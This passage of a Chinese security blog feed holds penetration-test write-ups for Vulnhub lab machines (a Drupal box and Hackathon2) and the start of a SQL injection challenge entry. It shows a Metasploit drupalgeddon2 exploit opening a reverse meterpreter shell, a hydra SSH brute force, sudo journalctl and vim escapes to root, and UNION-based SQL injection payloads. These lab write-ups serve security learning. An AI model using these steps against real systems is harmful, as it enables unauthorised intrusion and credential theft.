RCE</span></span><br><span class="line"><span class="string">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span></span><br><span class="line"><span class="string">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.109.145</span></span><br><span class="line"><span class="string">rhosts =&gt; 192.168.109.145</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 9001</span></span><br><span class="line"><span class="string">rport =&gt; 9001</span></span><br><span class="line"><span class="string">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.109.140:4444 </span></span><br><span class="line"><span class="string">[*] Executing automatic check (disable AutoCheck to override)</span></span><br><span class="line"><span class="string">[+] The target is vulnerable.</span></span><br><span class="line"><span class="string">[*] Sending stage (39282 bytes) to 192.168.109.145</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.109.140:4444 -&gt; 192.168.109.145:45078) at 2021-07-27 13:18:40 -0400</span></span><br></pre></td></tr></table></figure><p>利用成功，这里可在<code>misc</code>目录下找到应该存放用户名密码的文件（tyrell.pass），此处也参考了网络上的文章，应该在翻文件时不仔细。。。</p><p><strong>读取密码文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> tyrell.pass</span><br><span class="line">Username: tyrell</span><br><span class="line">Password: mR_R0bo7_i5_R3@!_</span><br></pre></td></tr></table></figure><p>得到用户名密码后可使用<code>ssh</code>进行连接<br>连接成功后需要提权，此处提权依然使用<code>sudo</code>进行提权</p><p><strong>提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> tyrell on vuln_cms:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User tyrell may run the following commands on vuln_cms:</span><br><span class="line">    (root) NOPASSWD: /bin/journalctl</span><br></pre></td></tr></table></figure><p>可以看到<code>journalctl</code>运行时不需要验证密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl </span><br><span class="line">-- Logs begin at Fri 2021-05-28 12:16:41 UTC, end at Tue 2021-07-27 17:31:18 UTC. --</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: Linux version 4.15.0-143-generic (buildd@lcy01-amd64-001) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) <span class="comment">#147-Ubuntu SMP Wed Apr 14 16:10:11 UT</span></span><br><span class="line">May 28 12:16:41 vuln_cms kernel: Command line: BOOT_IMAGE=/vmlinuz-4.15.0-143-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro maybe-ubiquity</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: KERNEL supported cpus:</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   Intel GenuineIntel</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   AMD AuthenticAMD</span><br><span class="line">May 28 12:16:41 vuln_cms kernel:   Centaur CentaurHauls</span><br><span class="line">May 28 12:16:41 vuln_cms kernel: [Firmware Bug]: TSC doesn<span class="string">&#x27;t count with P0 frequency!</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x001: &#x27;</span>x87 floating point registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x002: &#x27;</span>SSE registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x004: &#x27;</span>AVX registers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &#x27;</span>standard<span class="string">&#x27; format.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: BIOS-provided physical RAM map:</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000007fff0000-0x000000007fffffff] ACPI data</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: NX (Execute Disable) protection: active</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: SMBIOS 2.5 present.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: Hypervisor detected: KVM</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; reserved</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: remove [mem 0x000a0000-0x000fffff] usable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: e820: last_pfn = 0x7fff0 max_arch_pfn = 0x400000000</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR default type: uncachable</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR variable ranges disabled:</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: MTRR: Disabled</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/PAT: MTRRs disabled, skipping PAT initialization too.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: CPU MTRRs all blank - virtualized system.</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  UC- UC  </span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff]</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: Scanning 1 areas for low memory corruption</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: RAMDISK: [mem 0x30ec5000-0x34759fff]</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: Early table checksum verification disabled</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: XSDT 0x000000007FFF0030 00003C (v01 VBOX   VBOXXSDT 00000001 ASL  00000061)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACP 0x000000007FFF00F0 0000F4 (v04 VBOX   VBOXFACP 00000001 ASL  00000061)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: DSDT 0x000000007FFF0470 002325 (v02 VBOX   VBOXBIOS 00000002 INTL 20100528)</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040</span></span><br><span class="line"><span class="string">May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040</span></span><br><span class="line"><span class="string">!/bin/sh</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure><p>程序运行后，输入<code>!/bin/sh</code>可提升至<code>root</code>权限<br>读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /home/     </span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">elliot  ghost  tyrell</span><br><span class="line"><span class="comment"># cd elliot</span></span><br><span class="line"><span class="comment"># cat user.txt</span></span><br><span class="line">9046628504775551</span><br><span class="line"><span class="comment"># cd /root/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">4359537020406305</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><strong>done</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Hackathon2</title>
      <link href="/16564.html"/>
      <url>/16564.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（Hackathon2）的过程"><a href="#记录打靶机（Hackathon2）的过程" class="headerlink" title="记录打靶机（Hackathon2）的过程"></a>记录打靶机（Hackathon2）的过程</h2><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>这里使用的是<code>arp-scan</code>进行扫描，因为在使用<code>netdiscover</code>无法成功探测到网段下存活主机，不知道是不是命令使用不正确，后续研究一下。。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.1/24                                             </span><br><span class="line"></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">WARNING: host part of 192.168.109.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.144 00:0c:29:28:21:61       VMware, Inc.</span><br><span class="line">192.168.109.254 00:50:56:f2:84:70       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.934 seconds (132.37 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p> 经<code>arp-scan</code>探测后发现存在<code>192.168.109.144</code>这个IP地址，对此IP地址进行端口扫描，一般会存在80端口</p><p> <strong>端口扫描</strong><br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.109.144 </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.144</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 1000     1000           47 Jun 18 17:32 flag1.txt</span><br><span class="line">|_-rw-r--r--    1 1000     1000          849 Jun 19 05:11 word.dir</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.109.140</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_*/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: hackathon2</span><br><span class="line">7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)</span><br><span class="line">|   256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)</span><br><span class="line">|_  256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.09 seconds</span><br></pre></td></tr></table></figure><br> <code>nmap</code>扫描后发现存在21（ftp）、80（Apache-httpd）、7223（ssh）三个端口，针对这三个端口有必要进行以下信息收集：</p><ul><li>ftp（21）端口：<ul><li>尝试匿名用户登录（anonymous&#x2F;anonymous）✔</li><li>在漏洞数据库搜索相关ftp（vsftpd 3.0.3）版本漏洞 ✗</li></ul></li><li>http（80）端口：<ul><li>可进行目录扫描，爆破出隐藏的目录以及页面 ✔</li><li>查看已发现页面的源码，对<code>index.html</code>源码进行查看，无有用信息，因为是靶机，通常页面或者隐藏页面中源码会有一些有用的信息 ✔</li></ul></li><li>ssh（7223）端口<ul><li>在漏洞数据库搜索相关ssh（OpenSSH 8.2p1）版本漏洞 ✗</li><li>使用<code>hydra</code>进行爆破，此处需收集用户名、密码 ✔</li></ul></li></ul><p><strong>使用anonymous&#x2F;anonymous登录ftp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; open 192.168.109.144</span><br><span class="line">Connected to 192.168.109.144.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.109.144:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000           47 Jun 18 17:32 flag1.txt</span><br><span class="line">-rw-r--r--    1 1000     1000          849 Jun 19 05:11 word.dir</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure><p>匿名登录成功后可以看到<code>flag1.txt</code>和<code>word.dir</code>两个文件，猜测<code>word.dir</code>为一个字典文件，看了内容大概率是一个密码字典文件，如果使用其来爆破ssh用户名密码的话，此处还需要用户名， 因为本次靶机使用的ssh版本不存在用户名枚举漏洞，故猜测在80端口页面上可能存在用户名。</p><p><strong>进行目录扫描</strong><br><em><strong>这里有点问题：在使用dirb进行目录扫描时会发现除了几个通用的页面之外无其他有用信息</strong></em><br><em><strong>Tips：可以使用word.dic为字典文件进行目录扫描</strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.109.144/ word.dir </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 24 01:52:28 2021</span><br><span class="line">URL_BASE: http://192.168.109.144/</span><br><span class="line">WORDLIST_FILES: word.dir</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 109                                                           </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.109.144/ ----</span><br><span class="line">+ http://192.168.109.144/happy (CODE:200|SIZE:110)                                                                               </span><br><span class="line">                                                                                                                                 </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 24 01:52:28 2021</span><br><span class="line">DOWNLOADED: 109 - FOUND: 1</span><br></pre></td></tr></table></figure><p>经扫描后发现存在<code>happy</code>页面，访问后在源码上可发现暴露了一个用户名<br><img src="/images/pasted-18.png" class="lazyload" data-srcset="/images/pasted-18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><p><strong>爆破ssh</strong><br>整理一下信息，现在在80端口下的<code>happy</code>页面发现用户名，在ftp上发现<code>word.dic</code>字典文件，可以尝试爆破ssh，进一步获取权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hydra -l hackathonll -P word.dir -f -t 20 ssh://192.168.109.144 -s 7223 </span><br><span class="line"></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-24 00:16:41</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 110 login tries (l:1/p:110), ~6 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.109.144:7223/</span><br><span class="line">[7223][ssh] host: 192.168.109.144   login: hackathonll   password: Ti@gO</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.109.144 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-24 00:16:58</span><br></pre></td></tr></table></figure><p><code>hydra</code>已经爆破出密码：<code>Ti@gO</code></p><p><strong>连接ssh</strong><br>使用已爆破的用户名、密码进行ssh连接至靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ssh hackathonll@192.168.109.144 -p 7223                                    </span><br><span class="line"></span><br><span class="line">hackathonll@192.168.109.144<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sat 24 Jul 2021 07:38:22 AM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.01               Processes:              221</span></span><br><span class="line"><span class="string">  Usage of /:   24.2% of 18.57GB   Users logged in:        0</span></span><br><span class="line"><span class="string">  Memory usage: 20%                IPv4 address for ens33: 192.168.109.144</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">67 updates can be installed immediately.</span></span><br><span class="line"><span class="string">0 of these updates are security updates.</span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sat Jul 24 04:18:07 2021 from 192.168.109.140</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1001(hackathonll) gid=1001(hackathonll) groups=1001(hackathonll)</span></span><br><span class="line"><span class="string">$ </span></span><br></pre></td></tr></table></figure><p>连接成功，但是此时的用户为<code>hackathonll</code>，因此需要进行提权</p><p><strong>提权</strong><br>使用<code>sudo -l</code>查看是否可使用<code>sudo</code>进行提权，发现<code>vim</code>可以不验证密码具备<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hackathonll on hackathon:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hackathonll may run the following commands on hackathon:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vim</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上网查过后发现可直接使用<code>vim</code>进行提权，进入<code>vim</code>编辑界面时输入<code>!bash</code>可直接获取<code>root</code>权限<br><em><strong>可参考：<a href="https://blog.csdn.net/qq_39991837/article/details/118119954">https://blog.csdn.net/qq_39991837/article/details/118119954</a></strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br><span class="line"></span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># ls</span></span><br><span class="line">root@hackathon:/home/hackathonll<span class="comment"># cd</span></span><br><span class="line">root@hackathon:~<span class="comment"># ls</span></span><br><span class="line">flag2.txt  snap</span><br><span class="line">root@hackathon:~<span class="comment"># cat flag2.txt </span></span><br><span class="line">₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;</span><br><span class="line">root@hackathon:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>至此，Hackathon2靶机渗透完成。。。<br><strong>done</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>zixem SQL challenges</title>
      <link href="/19459.html"/>
      <url>/19459.html</url>
      
        <content type="html"><![CDATA[<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="/images/pasted-5.png" class="lazyload" data-srcset="/images/pasted-5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>简单的一关，常规的联合查询注入(数字型)。</p><pre><code>?id=1 and 1=2 union select 1,concat(user(),version),3--+</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="/images/pasted-6.png" class="lazyload" data-srcset="/images/pasted-6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 1简单，字符型注入，闭合单引号即可。</p><pre><code>?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="/images/pasted-7.png" class="lazyload" data-srcset="/images/pasted-7.png" 